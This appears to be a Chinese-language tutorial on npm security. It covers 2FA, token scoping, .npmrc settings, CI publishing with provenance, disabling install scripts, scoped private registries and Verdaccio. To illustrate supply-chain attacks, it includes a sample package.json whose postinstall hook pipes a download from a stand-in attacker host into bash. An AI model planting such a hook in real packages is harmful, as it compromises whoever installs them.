npm 安全

核心概念

npm 是 JavaScript 生态系统的核心包管理器，也是全球最大的软件注册表。npm 的安全涉及账号保护、包发布安全、注册表配置和安装时行为控制等多个层面。由于 npm 生态系统的开放性，攻击者可以通过发布恶意包、劫持维护者账号或利用 install 脚本等方式进行供应链攻击。

理解 npm 的安全机制并采取适当的防护措施，对于维护前端项目的完整性至关重要。

账号与 Token 安全
npm 账号是包发布的入口，其安全性直接影响下游所有用户：


npm profile enable-2fa auth-and-writes

npm token list

npm token create --read-only --cidr=192.168.1.0/24

npm token revoke <token-id>
.npmrc 安全配置：


# 项目级 .npmrc（提交到版本控制）
engine-strict=true
save-exact=true
ignore-scripts=true
audit=true

# 用户级 ~/.npmrc（不提交到版本控制）
//registry.npmjs.org/:_authToken=${NPM_TOKEN}
const npmSecurityBestPractices = {
  account: {
    enable2FA: true,
    useGranularTokens: true,
    regularlyRotateTokens: true,
    monitorLoginActivity: true,
  },
  tokens: {
    useReadOnlyForCI: true,
    restrictByCIDR: true,
    setExpiration: true,
    neverCommitToRepo: true,
  },
};
CI/CD 中安全使用 npm Token：


name: Publish
on:
  release:
    types: [published]

jobs:
  publish:
    runs-on: ubuntu-latest
    permissions:
      contents: read
      id-token: write
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: 20
          registry-url: 'https://registry.npmjs.org'
      - run: npm ci
      - run: npm publish --provenance --access public
        env:
          NODE_AUTH_TOKEN: ${{ secrets.NPM_TOKEN }}
install 脚本安全
npm 包的 install 脚本（preinstall/postinstall）是供应链攻击的主要载体：


{
  "scripts": {
    "preinstall": "node malicious.js",
    "postinstall": "curl https://evil.com/steal | bash",
    "install": "node setup.js"
  }
}
防御措施：


npm install --ignore-scripts

npm config set ignore-scripts true

npm rebuild <specific-package>
# .npmrc
ignore-scripts=true

# 选择性允许
# 在 package.json 中使用 pnpm 的 onlyBuiltDependencies
{
  "pnpm": {
    "onlyBuiltDependencies": ["esbuild", "sharp", "better-sqlite3"]
  }
}
审查 install 脚本：


npm pack <package-name> --dry-run

npm show <package-name> scripts

cat node_modules/<package-name>/package.json | grep -A5 '"scripts"'

npx can-i-ignore-scripts
私有注册表与 Scope 配置
私有注册表和 Scope 配置防止依赖混淆攻击：


# .npmrc - 项目级注册表配置
@mycompany:registry=https://npm.mycompany.com/
//npm.mycompany.com/:_authToken=${PRIVATE_NPM_TOKEN}

# 所有包使用公共注册表（默认）
registry=https://registry.npmjs.org/
interface RegistryConfig {
  scopes: Record<string, string>;
  defaultRegistry: string;
  security: {
    strictSSL: boolean;
    audit: boolean;
    fund: boolean;
  };
}

const secureRegistryConfig: RegistryConfig = {
  scopes: {
    '@mycompany': 'https://npm.mycompany.com/',
    '@internal': 'https://npm.mycompany.com/',
  },
  defaultRegistry: 'https://registry.npmjs.org/',
  security: {
    strictSSL: true,
    audit: true,
    fund: false,
  },
};
Verdaccio 作为轻量级私有注册表的配置：


# verdaccio config.yaml
storage: /data/verdaccio/storage
auth:
  htpasswd:
    file: /data/verdaccio/htpasswd
    max_users: -1

uplinks:
  npmjs:
    url: https://registry.npmjs.org/
    cache: true

packages:
  '@mycompany/*':
    access: $authenticated
    publish: $authenticated
    unpublish: $authenticated

  '**':
    access: $all
    publish: $authenticated
    proxy: npmjs

security:
  api:
    jwt:
      sign:
        expiresIn: 30d
包发布安全
发布 npm 包时的安全最佳实践：


{
  "name": "@mycompany/secure-lib",
  "version": "1.0.0",
  "files": ["dist", "README.md", "LICENSE"],
  "publishConfig": {
    "access": "public",
    "registry": "https://registry.npmjs.org/"
  }
}

小结
    

  • npm 账号必须启用 2FA，使用细粒度 Token 并定期轮换
    • 

  • ignore-scripts=true 防止安装时执行恶意脚本，仅白名单放行需要编译的包
    • 

  • 私有包使用 @scope 前缀并配置专用注册表，防止依赖混淆攻击
    • 

  • CI 中使用 --frozen-lockfile 安装，Token 通过环境变量注入而非硬编码
    • 

  • npm provenance 提供包来源的密码学证明，增强供应链可信度
    • 

  • 发布前使用 npm pack --dry-run 检查发布内容，避免泄露敏感文件
    • 

  • .npmrc 分为项目级（提交到仓库）和用户级（含凭证，不提交），职责明确
    • 

  • 定期审查 npm token list，清除不再使用的 Token
    •
